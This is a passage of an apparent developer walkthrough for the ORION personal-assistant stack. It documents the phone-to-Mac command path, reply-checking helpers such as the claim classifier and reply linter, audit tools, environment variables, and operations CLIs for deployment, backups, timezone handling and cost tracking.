**Timing summary**: phone poll 4 s; Mac poll 4 s; heartbeat about 32 s; command expiry 10 min on both the helper and orion-remote; brain `--timeout 90` with a 120 s Node kill; `CommandRunner` 180 s; voice gives up at 90 s. **Known weakness** (the dossier's finding, confirmed by the constants): up to two brain calls (about 240 s) can exceed the 180 s runner timeout, so a turn that gets a truth-check re-ask can be killed before it answers; and `tick()` handles commands one after another and publishes the heartbeat afterwards, so a chat longer than 120 s makes the phone show the Mac as "stale".

**Duplicate-run blocking happens in three places**: CloudKit record name = orion-remote `--id` (replay guard, `SEEN_KEPT=200`); `link.appliedLogs` (last 300) for logs; `link.alertedApprovals` for approval alerts.

**Not on this path**: `GatewayClient.swift` (the Mac app's own chat; same `openclaw agent` call at `:115-128`, session key `orion-app-v2` at `:53`, agent timeout 300 s from `RunTimeouts.swift:54`; a phone chat with no conversation therefore shares `orion-app-v2` with the Mac app, which is where the "turn running at the Mac" collision message comes from); `MessageBridge.swift` (iMessage reader); `PhonePlanRequests.swift` (only `kind=plan`); `backend/` (the v1 Python phone backend, kept only for schema/sync checks; the phone app has no HTTP path to it); "Flux" (`MobileCore/FluxTurns.swift` is Deepgram speech-turn detection for voice mode). The plugin touches this path only at `plugin/orion-control/src/episodic.ts:71-75`, where `nickWords()` drops everything before the "Nick's message follows" marker and any `[orion-remote...]` lines from journal capture.

**Names to remember**: CloudKit container `iCloud.com.nickmadaio.orion`, private database, zone `OrionLink`; UserDefaults keys `link.phoneToken` (phone), `link.changeToken`, `link.alertTypeReady`, `link.alertedApprovals`, `link.appliedLogs`, `link.chatExports` (Mac helper), `orion.localChat.v1`, `orion.localChat.synced`, `orion.outbox.v1` (phone); session keys `orion-app-v2`, `orion-chat-<uuid>`; app groups `group.com.nickmadaio.orion` (phone) and `JQNK3T6ACY.com.nickmadaio.orion` (Mac).

**Dossier git history** (as recorded): `RemoteViews.swift` a44ce44 2026-10-12, ff0ec35 2026-10-02, 51e0b56 2026-10-01, b59bdca 2026-09-30 (ORION for iPhone); `CloudLink.swift` 094ebe2 2026-10-07; `LinkEngine.swift` dce48ae 10-08, a139f4b 10-07, ae41446 10-02; `CommandRunner.swift` ff0ec35 2026-10-02, b59bdca 2026-09-30; `scripts/orion-remote` 37 commits since d9cf665 (2026-08-11), the phone-era ones from 2026-09-28 to 2026-10-07 (`a139f4b`, `54f5e05`, `a7f506b`, `9e901a9`, `6eb4dca`, `75ebf7e`, `2b4301c "a stuck turn ends instead of spinning"`, `e568abb`, `b1b530b`, `e11dc82`, `cd1bcb6`, `295000a`). Swift files outside this chapter's scope are covered in [07_mac_app_swift.md](07_mac_app_swift.md) and [10_end_to_end_walkthroughs.md](10_end_to_end_walkthroughs.md).

**Questions to ask your tutor (whole path)**
1. Why does the phone write a CloudKit record instead of calling an HTTP endpoint, and what does that do for security and for "Mac is asleep"?
2. Where exactly could a duplicate execution arise, and which of the three guards stops it?
3. Why is `ORION_BRAIN_THINKING=low` forced for non-local models picked on the phone?
4. Trace what the user sees if the Mac wakes 11 minutes after the message was sent.
5. Which timeout fires first for a re-asked turn, and what does the phone show?

---

### 8.8 `scripts/lib/remote/*`: the reply and rule helpers

Five small pure ES modules (no I/O, no model calls). Only three are wired into `orion-remote`; two are finished libraries with tests but no runtime caller at this snapshot (verified: `grep` for their names in `scripts/` and `plugin/orion-control/src` finds only the modules themselves and `tests/`). Deep coverage of `claims.mjs` and `reply-lint.mjs` is in [05_plugin_turn_pipeline.md](05_plugin_turn_pipeline.md) (section 17); this section is the short map.

| Module | Lines | Wired into | Public functions |
|---|---|---|---|
| `claims.mjs` | 291 | `orion-remote:36, 739-740` | `classifyClaim` (259) |
| `reply-lint.mjs` | 293 | `orion-remote:37, 833-835` | `lintReply` (135), `fixReply` (183), `clock12` (14), `RULES` (3) |
| `standing-rules.mjs` | 47 | `orion-remote:38, 756` | `readStandingRules`, `parseDuration` |
| `reply-person.mjs` | 188 | nothing (tests only: `tests/truthful-reply-person.test.mjs`) | `findThirdPerson` (69), `toSecondPerson` (94) |
| `reply-times.mjs` | 120 | nothing (tests only: `tests/truthful-reply-times.test.mjs`) | `mentions` (51), `checkReplyTimes` |

**`claims.mjs`** — `classifyClaim(reply, {toolsRun})` (`:259-291`) returns `{kind: "done"|"cant"|"none", phrase, needsCheck}`. Rules in order, first match wins: data absence ("I don't have a location for that event": a negation within 4 words of a data noun such as location/events/data/record/entry, not followed by a capability noun such as tool/capability/integration/way) is `none` (`isDataAbsence`, `:19`); an inability ("I can't", "I cannot", "am unable to", "don't have a way to", "don't have access to", "I don't have a direct ... tool/capability/integration/way", "can't list ... through the phone") is `cant` (`isCant`, `:104`); a completion ("done.", "all set", "I've set/added/booked/moved...", "reminder set", plus edit verbs like "combined", "merged", "renamed", "updated"; any reply containing a `?` never counts as done) is `done` (`isDone`, `:141`); else `none`. `needsCheck` is true when a claim was made and `toolsRun === 0`. `orion-remote` uses only `kind`, not `needsCheck`, and only calls it when zero tools ran (`orion-remote:732-741`). Origin: the model wrote this ("Qwen's tested classifier (tighten-orion/claims)", comment at `orion-remote:737-738`), 2026-09-30, commit `c2eda84`. The rule "data absence is not an inability" came from a real regression: the earlier broad regex re-asked "I don't have a location for that event" and made ORION narrate his investigation of the calendar script to Nick (comment `orion-remote:681-685`).

**`reply-lint.mjs`** — `lintReply(text, {spoken})` returns findings `{rule, excerpt}` for six rules: `meta_talk` (the reply mentions plumbing: "script", "the tool", "tool_search", "catalog", "exec", "TOOLS.md", "AGENTS.md", "this check", "allowlist", "my previous answer", and similar 14 phrases at `:26-41`), `time_24h` (a 24-hour time like 20:32), `time_both` (24-hour and 12-hour both present), `markdown_spoken` and `too_long_spoken` (> 320 chars; only with `{spoken:true}`, which `orion-remote` never passes since text replies are read, not spoken), `repeated_sentence`. `fixReply` mechanically fixes what is fixable: rewrites 24-hour times to 12-hour (`clock12`), collapses "20:32 GMT+1 (8:32 PM)" or "20:32 — 8:32 PM" to just the 12-hour time, de-duplicates repeated sentences keeping the first, and (spoken only) strips markdown. It does **not** fix `meta_talk`; `orion-remote` records the remaining rule names as `lint` in the audit line only (`:833-835`, `:865`), it does not block the reply. Origin: `c2eda84` 2026-09-30; the "20:32 GMT+1 (8:32 PM)" reply is the same incident as `quickAnswer`.

**`standing-rules.mjs`** — `readStandingRules(message)` -> `{standing, statement, minimums:[{key, minutes}]}` (`:31-47`). `standing` is true if any sentence matches the `STANDING` regex (`always`, `going forward`, `from now on`, `moving forward`, `in the future`, `every time`, `every day`, `never again`, `remember that/this/to`, `make sure you/to always`, `by default`) or a minimum was parsed. `statement` is the matching sentences, joined, max 400 chars. A **minimum** is read from "`<thing>` should be at least `<duration>`" or "at least `<duration>` for `<thing>`": the key is the last content word of the thing, singularized ("naps" -> "nap"), and it needs >= 3 characters, a duration between 5 and 600 minutes, and either a standing phrase or "should/must". `parseDuration(text)` (`:13-26`) understands "an hour and 15 minutes", "1h15", "75 min", "an hour and a half", "2 hours". Callers then save the minimum with `setMinimum` and the words into USER.md and the vault (8.3 step 6). Added `3034d64` 2026-10-01; tweaked `0a0aa7e` 2026-10-02. Tests: `tests/remote-standing-rules.test.mjs`.

**`reply-person.mjs`** (unwired library) — "Talk to him, not about him" (commit `87bc5e5` 2026-10-01, agent-written, followed by two repair commits). The model sometimes says "He needs..." / "Nick's ..." about the person it is talking to. `findThirdPerson(reply)` (`:69-92`) returns `[{phrase, index}]` for his/he/him/himself/Nick/Nick's that refer to Nick (`isNickReference`, `:32`, excludes your brother/the professor/your friend). `toSecondPerson(reply)` (`:94`) rewrites them ("he's" -> "you're", "he has" -> "you have", "Nick's" -> "your"), skipping quoted text. No runtime caller.

**`reply-times.mjs`** (unwired library) — "Do the times ORION says match what was booked?" Written by Claude on 2026-10-01 from Qwen's draft (commit `4032800`, repaired in `7e7f988`). Incident, 2026-09-30: ORION booked "finish resume" 14:30-16:00 and told Nick "resume at 4:00 PM"; and "dinner 7:30, gym 7:30-8:30" for a gym at 19:30 and dinner at 20:30. `mentions(reply)` parses each clock time with the clause it sits in (`near`); `checkReplyTimes(reply, booked)` takes `booked: [{title,start,end}]` (minutes after midnight), matches each time to the block whose title shares the most words with its clause, accepts either AM/PM reading when it was not said (bare-hour rule: 1-7 -> PM, 8-11 -> AM, 12 -> noon), and returns `{ok, mismatches:[{title, said, booked}], unmatched}`. Idea only so far: the check exists and is tested, but `orion-remote` does not call it, so a wrong time in a reply is not caught at this snapshot.

- **Walk it yourself**
  1. `grep -n "classifyClaim\|fixReply\|lintReply\|readStandingRules" scripts/orion-remote` — the three wired calls.
  2. `grep -rn "reply-person\|reply-times" scripts plugin/orion-control/src` — expect no callers outside the modules.
  3. `node --test tests/truthful-reply-times.test.mjs` runs pure unit tests (no network, no model). Read-only on the repo.
- **Questions to ask your tutor**
  1. What is the difference between "claimed done with zero tools" and "claimed cant without looking", and why does the retry go to a stronger model?
  2. Why is lint recorded but not enforced, while `fixReply` rewrites the text before Nick sees it?
  3. What is the sequence that makes "naps at least an hour and 15 minutes, always" a durable change in three different stores?
  4. Why would a `checkReplyTimes` result be worth enforcing, and what would it need to compare against?

---

### 8.9 `scripts/lib/orion-remote-audit-stats.mjs` and `scripts/lib/audit/chat-log.mjs`

Two analysis helpers over the logs this chapter produces. Both are pure functions.

**`orion-remote-audit-stats.mjs`** (73 lines; commit `fa584c6` 2026-09-27, agent-written "What the remote channel was asked, and what it refused"). `remoteAuditStats(rows, {from, to})` (`:6-73`) takes parsed rows of `remote-audit.jsonl` (each with `at`, `decision`, optional `verb`, `reason`) and the window `[from, to)` in epoch ms, and returns `{total, byDecision, byVerb (top 10), perDay (UTC date buckets), topRefusalReasons (top 5, reason truncated to 120 chars), skipped}`. Rules: a row whose `decision` is not a string or whose `at` does not parse counts as `skipped`; a row outside the window is excluded but not skipped; a missing verb counts as `"(none)"`; refusal reasons come only from `refused`, `rejected` and `error` rows that have a string `reason`; ties sort by count descending then name ascending. **No CLI or runtime caller exists** at this snapshot (only `tests/ops-remote-audit-stats.test.mjs`); it is a ready building block for a dashboard or report. Note the audit `decision` values it expects match what `handleUnlocked` writes (`accepted`, `rejected`, `refused`, `error`).

**`audit/chat-log.mjs`** (103 lines; commit `de87e8c` 2026-10-06, backlog #35 "orion-log-audit finds recurring failures in real ORION chats"). Reads OpenClaw session transcripts (`~/.openclaw/agents/main/sessions/*.jsonl`) and flags what Nick had to fight with. Caller: `scripts/orion-log-audit` (`import { readTurns, findIssues, summarize }` at its line 13; flags `--dir PATH`, `--archive`, `--since YYYY-MM-DD`, `--include-evals`, `--json`, `--out FILE`; read-only except `--out`; skips eval sessions by sniffing `"sessionKey":"...eval..."` in the sibling `.trajectory.jsonl`).
- `readTurns(lines, {file})` (`:37-57`) parses JSONL lines into turns `{file, index, at, role, text, tools, isError, model}`. It follows `model_change` and `model-snapshot` entries so each turn knows its model. For **user** turns it cuts the text down to Nick's own words by taking what follows the last marker `--- Nick's message follows ---\n` or `User message:\n` (`MARKERS`, `:17-24`), so the channel brief and phone context are discarded. It drops synthetic user turns that start `[orion-remote check]` (the truth-check re-asks, `:26, :48`). Tool names become `exec:<script>` for `exec` calls.
- `findIssues(turns)` (`:66-93`) emits findings of seven kinds with categories: `cannot-do` (missing-capability: "I can't", "I'm unable", "I don't have access"), `protected-refusal` (integration-issue: same plus "protected|allowlist|not permitted|sandbox"), `tool-error` (tool-issue: toolResult with `isError` or non-zero exit code, or text starting error/failed/refused/NOTHING WAS CHANGED), `repeat-tool` (reasoning-issue: the same tool called 3+ times for one user turn), `rephrase` (ux-issue: the next user turn within 10 min with Jaccard word overlap >= 0.6), `user-frustration` (ux-issue: "again", "still not", "why did/didn't", "that's wrong", "no, I said"), `slow-turn` (latency: assistant reply more than 120 s after the user turn). `summarize(issues)` gives counts by category and kind plus up to 5 examples per kind.
- Walk it: `sed -n 1,60p scripts/orion-log-audit`; `sed -n 66,93p scripts/lib/audit/chat-log.mjs`. Running `scripts/orion-log-audit --json` is read-only but prints excerpts of Nick's real chats; do not share the output.
- Tutor questions: (1) Why strip the channel brief before looking for frustration words? (2) Why exclude eval transcripts? (3) Why is the repeated-tool rule a signal of a reasoning problem rather than a tool problem?

---

### 8.10 Reference: env vars, files on disk, exit codes, timeouts

**Environment variables (all names; no values)**

| Name | Read at | Default | Effect |
|---|---|---|---|
| `ORION_REMOTE_ALLOW` | `orion-remote:191-193`; `orion-remote-bridge:137-140` | `local` | Comma list of sender names that are obeyed. Re-read each message. The helper sets `phone`; the bridge reads it from env or `.env` and passes it to the child. |
| `ORION_DISCORD_BOT_TOKEN` | `orion-remote-bridge:111` | none (bridge refuses to start) | Discord bot credential; sent only in the IDENTIFY/RESUME frame and the REST `Authorization: Bot` header; redacted from all output. Value lives in `<repo>/.env` and the installed `.env`. |
| `ORION_DEVICE_ID` | `orion-remote:163` | lower-cased hostname | This device's id for envelope routing. |
| `ORION_BRAIN_SESSION` | `orion-remote:91` | `orion-app-v2` | OpenClaw session key for the turn (phone helper sets `orion-chat-<uuid>`). |
| `ORION_BRAIN_MODEL` | `orion-remote:804` | unset (use OpenClaw's configured model) | Passed as `--model`; the phone's model picker and eval runs set it. |
| `ORION_BRAIN_THINKING` | `orion-remote:810` | per-message `thinkingLevel()` | `off|minimal|low|medium|high` for the whole run. |
| `ORION_BRAIN_BIN` | `orion-remote:95` | `~/.openclaw/bin/openclaw` | Test seam: replace the model binary. |
| `ORION_ESCALATION_MODEL` | `orion-remote:700` | `anthropic/claude-sonnet-5` | Model for the truth-check re-ask; `off` keeps the default model. |
| `ORION_REMOTE_MISSION_BIN` | `orion-remote:64` | `scripts/orion-mission` | Test seam for `orion-mission`; recorded in audit when non-default. |
| `ORION_REPO` | `orion-remote:1350` | checkout or `~/Desktop/ORION` | Where `locateOperator` finds `orion-project-agent`; also a test seam. |
| `ORION_REMOTE_REPLY_CHANNEL`, `ORION_REMOTE_REPLY_TARGET` | `orion-remote:1755` | unset | If both set, `poll` also sends replies via `openclaw message send`. |
| `NODE_TLS_REJECT_UNAUTHORIZED` | `orion-remote-bridge:585` | unset | If `0` the bridge refuses to run. |
| `ORION_BRIDGE_BIN`, `ORION_SANDBOX_CALENDAR`, `ORION_RESCHEDULE_NOW` | `scripts/lib/life/bridge-path.mjs:16-31` | unset | Affect `sandbox()` and `clockNow()` used by `phoneContext` and the `eval-` file prefixes (evaluation runs only). |

**Files on disk (all under `~/.openclaw/orion-controlled/` unless noted)**

| File | Writer | Reader | Contents |
|---|---|---|---|
| `remote-audit.jsonl` | `orion-remote` (`audit`) | `orion-remote audit`, humans, `remoteAuditStats` | One JSON line per decision. Contains message text (first 200 chars). |
| `remote-inbound.json` (`eval-` prefix in sandbox) | `admitInbound`, `poll` | same | `{cursor, seen[<=200 ids], hits[{from,at}]}` |
| `remote-inbound.lock/` (dir with `owner.json`) | `admitInbound` | same | Directory lock with pid. |
| `remote.json`, `remote.json.lock` | `orion-remote`, `orion-notify` | both | `{missions, pending, notify}` |
| `inbox.jsonl`, `outbox.jsonl` | `inject`/`poll` | `poll` | File transport envelopes and replies. |
| `remote-link.json` | bridge | Mac app, `status` | Discord link health, no content. |
| `remote-runner.log` | `doResume` | humans | Output of detached `orion-mission resume`. |
| `lock.json` | `orion-lock` | `isLocked()` | `{locked: true|false}` (the panic button). |
| `brain-<hex>.txt` | `askBrainOnce` | `openclaw agent` | Temporary prompt file, 0600, deleted afterwards. |
| `actions/running/*.json`, `actions/cancel/<id>` | plugin / `doAction` | both | Running plugin actions and cancel flags. |
| `outreach.jsonl`, `watch.json`, `checkins.json` (`eval-` in sandbox) | other ORION scripts | `phoneContext` | Context facts. |
| `~/.openclaw/workspace/SCHEDULING.md` | humans/plugin | `phoneContext` (first 12000 chars) | Scheduling preferences. |
| `~/.openclaw/orion-gate/approvals/` and `~/.openclaw/extensions/orion-control/dist/approvals.js` | plugin | `resolveGateApproval` | Gate approval tickets and code. |
| `~/Library/Logs/orion/remote-bridge.log` | launchd | humans | Bridge stdout/stderr. |

**Exit codes**: `orion-remote handle` 0 = ok, 1 = refused/failed (reply text may be on stdout; none = silent rejection), 2 = bad usage or unknown flag (`fail`); `inject` 0 / 2; `audit` 1 if no log. `orion-remote-bridge`: `probe` 0 ok, `run`/`probe` 1 on a fatal gateway code, `fail` exits 2 (missing token, TLS check, usage), `status` 1 if no link file. `orion-remote-install`: 0, 1 (launchd would not load), 2 (no node or token), 64 (unknown option).

**Timeouts and limits**: `BRAIN_TIMEOUT_S` 90 s; Node exec timeout 120 s; helper `CommandRunner` and bridge `dispatch` 180 s; operator (agent halt) 12 s; mission cancel 30 s; `orion-reschedule minimums` 30 s; `orion-remember` 15 s; `orion-phone-time status` 5 s; system probes 10 s; `openclaw message send` 30 s; state lock 60 x 100 ms, stale after 15 s; replay lock 10 s wait, stale after 5 s; envelope age 10 min; rate 40 / 10 min; seen ids 200; message limits 200 B (verb), 4000 B (brain), 2000 chars (phone validator), 1900 chars (Discord reply); files listing 40 entries.

**How auth works, in one paragraph (no secrets)**: nothing is "paired". The Mac is already logged into iCloud, and CloudKit's private database means only Nick's own devices can write `LinkCommand` records; the helper then asserts the sender name `phone` in `ORION_REMOTE_ALLOW`. For Discord, the bot logs in with `ORION_DISCORD_BOT_TOKEN`, and only Discord author ids listed in `ORION_REMOTE_ALLOW` (read from `.env` each message) are obeyed; strangers are dropped silently in the bridge and again in `orion-remote`. Both are replay-protected by message id, expire after 10 minutes, are rate-limited per sender, can be killed by `LOCK ORION` (except halts), and can never approve as `local`/`orion`.


---

## 9. Operations CLIs (deploy, doctor, time, backup, cost, keys)

Scope note: this section was written by the chapter author directly from the script headers and key code, after the helper that was meant to research it was cut off by a usage limit. It is shorter and more header-driven than sections 2 to 8. Each script's own header comment is long, written in the first person, and explains the incident behind it; open them, they are good reading. Everything here is read-only analysis: `orion-deploy`, `orion-backup`, `orion-keys` and `orion-timezone set` were not run.

### 9.1 `orion-deploy`
- **What it is** — The only sanctioned way to put the compiled `plugin/orion-control` into the live gateway. Header: it replaces `cp dist/*.js ~/.openclaw/extensions/orion-control/dist/`, "typed by hand ... several times today", with nothing checking tests, keeping the previous copy or noticing a broken copy (`scripts/orion-deploy:5-12`). Bash, 13.5 KB, Phase 70.
- **Where** — `scripts/orion-deploy`. Paths set at lines 40-43: `REPO`, `PLUGIN=$REPO/plugin/orion-control`, `INSTALLED=$HOME/.openclaw/extensions/orion-control`, `INTEGRITY=scripts/lib/orion-integrity.mjs`.
- **How it works** — Seven numbered stages, each printed as `== N. title ==`: (1) refuse a dirty tree unless `--allow-dirty` (line 111); (2) `npm run build` in the plugin (126); (3) run every suite, source and machine: `orion_v2_ci_check.sh --quick`, `orion_v2_attack_check.py`, `orion_v2_strictness_check.sh`, `orion_v2_authority_contract_check.sh`, `orion_v2_lock_check.sh`, `orion_v2_remote_check.sh`, `orion_v2_phase_gate.py` (132-170); a failure stops here; (4) snapshot what is installed NOW into a backups directory, keeping five (`ls -1t | tail -n +6 | rm`, line 193); (5) install from an empty dist, excluding compiled `*.test.js` files and recording an integrity manifest (196-227); (6) prove the plugin still loads and exposes its tools (228); (7) regenerate derived views (299). If step 6 fails it rolls back automatically.
- **Contracts** — Flags: none (the whole thing), `--dry-run` (everything except install), `--rollback` (put the previous version back), `--status` (what is installed and what is waiting), `--allow-dirty`; anything else dies "unknown option" (lines 34-37, 100-110). Writes `~/.openclaw/extensions/orion-control`, the gate integrity record under `~/.openclaw/orion-gate/integrity` (`scripts/lib/orion-integrity.mjs:32`), a build log at `/tmp/orion-deploy-build.log`.
- **Calls out to** — npm, node (`orion-integrity.mjs record|verify`), the seven check scripts, and presumably the gateway restart through the plugin load check (**inferred**; stage 6 body not read in full).
- **History** — `32b9a3f` 2026-09-07 introduced the file in the computer-use commit; `ceb6b79` 2026-09-15 folded plugin directories into `plugin/`; `d7d80e8` 2026-09-18 added repair-candidate deployment checks; `9855d99` 2026-09-26 added integrity recording (Phase 48, "an installed copy that was changed outside its installer does not run").
- **Gotchas & lessons** — Test files are not shipped because `orion_v2_rules_check.py` flagged synthetic credential fixtures inside compiled `index.test.js`/`gate.test.js` as "production credentials inside binaries" (`orion-deploy:201-210`); the comment itself had to avoid quoting the fixture because the secret scanner tripped on the description. "CI was green" is not enough on this machine because the bottom five suites assert against the real allowlist and live permission state (133-136). A backup copy that failed verification is restored but not re-recorded as trusted (48-49).
- **Walk it yourself** — `sed -n 19,40p scripts/orion-deploy` (the order is the protection); `grep -n '^echo "== ' scripts/orion-deploy` (seven stages); `sed -n 40,70p scripts/lib/orion-integrity.mjs` (manifest, `record`, `verify`).
- **Questions to ask your tutor** — Why is the working-tree check stage 1, before the build? Why snapshot the installed copy instead of the last build? What does stage 6 catch that tests cannot? How does `orion-repair` (section 10) differ?

### 9.2 `orion-doctor`
- **What it is** — One zsh command that diagnoses the whole stack by live probes, not config reads. Written after the TTS daemon ran under a Python without `mlx_audio` and silently reloaded the model per chunk (`scripts/orion-doctor:5-8`). Rule: "report what is ACTUALLY true at runtime" (10-11).
- **How it works** — Sections, in order: python/MLX (line 58), TTS daemon (78), voice providers (125, presence only, never values; lookup order environment, Keychain, `.env` to match consumers, 133-136), gateway (237), `Orion.app` (265), connected accounts (301, a live Gmail request because a dead `invalid_grant` token looked healthy locally and went unnoticed between 2026-08-13 and 09-07; commit `b5987f5` 2026-09-07), permissions (343).
- **Contracts** — `orion-doctor [--live-agent]`; `--live-agent` also runs one paid end-to-end model turn (lines 13-24). Env: `ORION_TTS_SOCKET` (default `~/.openclaw/orion-tts.sock`), `ORION_OPENCLAW_BIN`, `ORION_ENV_FILE`. Reads `~/.openclaw/openclaw.json`. Exit non-zero when `fail` is set.
- **History** — `dff87ea` 2026-07-30 "Stop trusting a socket file to mean a daemon is alive"; `1c9c503` 2026-09-01 Keychain-backed provider secrets; `b5987f5` 2026-09-07 live Gmail probe.
- **Gotchas** — Default run is free; only `--live-agent` costs money. Neutral colour for things never meant to be on, so yellow keeps meaning something (48-50).

### 9.3 `orion-timezone`
- **What it is** — Where Orion thinks "home" is, and the single command that moves it. Phase 40 (travel and timezone). Node, 20.8 KB.
- **How it works** — `location.json` under `~/.openclaw/orion-controlled/` records HOME (an IANA zone and a place name for weather), deliberately separate from the machine zone (`scripts/orion-timezone:2-64`). Home equal to device: nothing to say. Different: a trip or a move; only Nick knows which, so a move is recorded ahead of time as `expectedMove`. `set` re-homes three cron jobs pinned to `America/New_York` through the gateway CLI, rewrites the weather place and the record, and appends to `location-audit.jsonl` with the previous value; it is idempotent. It never runs on its own: `orion-standing` reports the mismatch hourly and a person acts (23-45).
- **Contracts** — `status`, `plan <IANA> [--place P]` (dry run), `set <IANA> [--place P]`, `expect <IANA> <YYYY-MM-DD> [--place P]`, `clear-expected` (header lines 49-53). Zone names are validated: anything that is not a real zone with transition rules is refused, and any spelling change is reported rather than silently performed (131-133). The gateway binary path is overridable as a test seam (66-71).
- **History** — `50f7110` 2026-09-01 London, the timezone, and the horizon between an event and a loop; `0eb1d00` 2026-09-01 end-to-end test of `set` against a fake gateway, motivated by `orion-lock` once treating status "applied" as failure (72-75).
- **Gotchas** — The incident: three nightly jobs would have moved from 02:10 New York to 07:10 London with nothing noticing. "A date in a sentence is not a mechanism": `USER.md` said "ask once after the move" and the deadline passed unobserved. The authoritative rule lives in Swift (`TimeZonePolicy.verdict`, 18 tests); this file mirrors it for reporting (203-205).

### 9.4 `orion-backup`
- **What it is** — Encrypted backups, with secrets deliberately excluded. Phase 73, bash.
- **How it works** — A backup is a second copy, and a second copy of a credential is a second leak; every secret is recoverable by rotating it at the issuer, so none is backed up, only an inventory of which exist and where they rotate (`scripts/orion-backup:5-19`). `tar -czf -` of selected sources piped to `openssl enc -aes-256-cbc -pbkdf2 -iter 600000`, passphrase from the login Keychain item `orion-backup` over file descriptor 3 (never argv, never disk). Excludes `.env`, `*.key`, `*token*`, `*credential*`, `node_modules`, `*.log`, `sessions-archive`, `repair-backups` and test workspaces (lines 108-117); configuration files are REDACTED in the archive rather than excluded (153, 305).
- **Contracts** — `orion-backup` (make one), `--verify` (decrypt the newest and check end to end), `--list`, `--restore <archive> <dir>`, `--secrets` (what is not included and where to rotate it). Destination `ORION_BACKUP_DIR`, default `~/Documents/OrionBackups`, files `orion-*.tar.gz.enc`. It refuses rather than prompting, generating a passphrase, or falling back to no encryption (21-28). Add one with `security add-generic-password -a "$USER" -s orion-backup -w`.
- **History** — `4b8915b` 2026-09-04 (phases 71-80); `f8f69d2` 2026-09-04 "the backup held a live token" (hence the redaction step).
- **Gotchas** — The first version put the passphrase function inside the pipe, so openssl encrypted only the passphrase and produced a plausible 12 KB archive with no data; `scripts/orion_v2_backup_check.sh` caught it (30-44). `-pass pass:` shows in `ps`; `-pass file:` writes the secret down.

### 9.5 Cost and usage: `orion-usage`, `orion-costs`, `orion-budget`, `scripts/lib/usage/*`
Three CLIs, two generations, which is a trap worth knowing.

- **`orion-usage`** (59 lines, newest, 2026-10-07 `f11402b`): reads every `*.trajectory.jsonl` in `~/.openclaw/agents/main/sessions` (override `ORION_SESSIONS_DIR`), keeps `model.completed` events via `rowFromTrajectory` (`scripts/lib/usage/usage.mjs:19`), adds ORION's own direct local calls from `~/.openclaw/orion-controlled/local-usage.jsonl` (`ORION_LOCAL_USAGE`), caches parsed files by size and mtime in `usage-cache.json` (`ORION_USAGE_CACHE`) so the Mac app can call it on every open, and prints today, 7 days, month, projection and per-model and per-source lines. Flags: `--json`, `--budget <dollars>` (default 15), env `ORION_NOW`. `README.md` advertises `orion-usage --all --json`, but `scripts/orion-usage` has no `--all` handling (it only reads `--json` and `--budget`); the extra flag is silently ignored, so docs and code disagree and the code wins.  Pure logic is `report(rows, {now, budget})` (`usage.mjs:64`): month projection `monthReal = realMonth / daysSoFar * daysInMonth`, excluding sources "tests" and "checks". Prices per million tokens at `usage.mjs:6-11`: haiku-4-5 1 in / 5 out, sonnet-5 and sonnet-5-5 2 / 10, opus-5-5 4 / 20; cache read and 5-minute/1-hour cache write columns. Local `ollama/` models cost 0.
- **`orion-costs`** (124 lines): reads `lib/orion-inference-summary.mjs` over a JSONL file; flags `--file`, `--days` (default 7), `--now`, `--json`. The inference-ledger path (`orion_v2_ingest_inference.py` builds the ledger).
- **`orion-budget`** (403 lines, Phase 67, legacy ceiling checker): reads the same sessions plus `task-ledger.jsonl`, `sessions-archive`, and `budgets.json` (all under `~/.openclaw`). Defaults at `scripts/orion-budget:77`: `daily: { totalTokens: 5_000_000, modelCalls: 400 }`, per-task ceilings of tool calls and seconds (326-328). "Ceilings, not targets", set from a week of real measurement; a malformed or partial `budgets.json` falls back to the built-in ceilings, never to no ceiling (105-116). Flags (50-55): none (today), `--days 7`, `--tasks`, `--check` (silent unless something is over, exit 1 on breach, for cron), `--json`. It reads recorded costs only and keeps recordedCost separate from rate-table estimates because many gateway rows carry zero cost, which "does not establish that a call was free".
- **Price tables disagree.** `scripts/lib/usage/report.mjs:5-8` prices sonnet-5 at 3 / 15 and haiku cache write at 1.25, while `usage.mjs:6-11` prices sonnet-5 at 2 / 10. The two modules serve different callers (`report.mjs` the app-facing summary with coverage fields such as `unpricedCloudCalls`, `usage.mjs` the CLI). Treat any dollar figure as an estimate and check which module produced it. Neither blocks a call; nothing here stops spending, it only reports and, via `orion-budget --check`, exits non-zero.
- **Walk it yourself** — `node scripts/orion-usage --json | head -c 600` (reads local files, no model calls); `sed -n 60,90p scripts/lib/usage/usage.mjs`; `sed -n 70,80p scripts/orion-budget`.

### 9.6 `orion-keys` (names only)
- **What it is** — Interactive key manager for `~/Desktop/ORION/.env` (gitignored). Written 2026-07-30 (`14cf030`) after a hand-edited key was the wrong length: `ELEVENLABS_API_KEY` held 40 characters where a key is about 51, the length of the Deepgram key beside it. It asks the vendor whether each key works.
- **Contracts** — `orion-keys` (status, offer to change), `orion-keys --check` (status only). Variables handled: `ELEVENLABS_API_KEY` (expected length 51; tested by synthesising two characters through the text-to-speech endpoint, because `/v1/user` needs a scope a working key may lack and "cost hours", commit `95a9cac`), `DEEPGRAM_API_KEY` (length 40; `GET https://api.deepgram.com/v1/projects`). Temp file `/tmp/orion-k.json`. Never prints a value. Do not run it casually: it makes vendor API calls.

### 9.7 Other ops CLIs in this group (short form)
| CLI | What it does, from its header |
|---|---|
| `orion-setup` (531 lines, zsh) | One command: build the app, sign with a stable identity, install, start the voice daemon, check the gateway, launch; safe to re-run; log copy to a file |
| `orion-identity-check` | Same designated requirement as the installed build? A one-byte difference makes macOS treat the update as a different app, losing microphone/accessibility grants and Keychain items |
| `orion-permissions` | Explains why Accessibility "is granted but not": ad-hoc signing makes each rebuild a new app by cdhash |
| `orion-authority` (681 lines) | Reports the two-layer authority (plugin gate vs exec allowlist) as four levels rather than yes/no; subcommands `show`, `check <capability>`, JSON output (`:670-677`); parses `case "..."` labels from source (349) |
| `orion-verify-gate` | Restarts the gateway and proves the shell tools (`exec`, `process`, `write`, ...) are gone and the gate is in the path |
| `orion-privacy` (373 lines) | Privacy controls made usable (revoke, delete) rather than "obscure" |
| `orion-readiness` (python) / `orion-tools` (python) | Readiness report and tool inventory |
| `orion-trace` (226 lines) | Renders session message transcripts and `.trajectory.jsonl` files (compiled context, model, tool inventory, final status) to read a failed turn |
| `orion-log-audit` | Finds recurring failures in real chats as candidate eval cases (2026-10-06) |
| `orion-runs` | Read-only status of the dev-loop runs, same files the Mac app reads |
| `orion-health` | Read-only sleep, recovery and tracking from the app's health log (WHOOP data); day turns at 4 AM |
| `orion-log` | `water [bottles]` and `food "<what>" <kcal> [protein_g] [meal]` write the health log under the same lock file the app uses (`<file>.lock`, broken after 15 s, given up after 6 s); `ORION_HEALTH_LOG` redirects for tests |
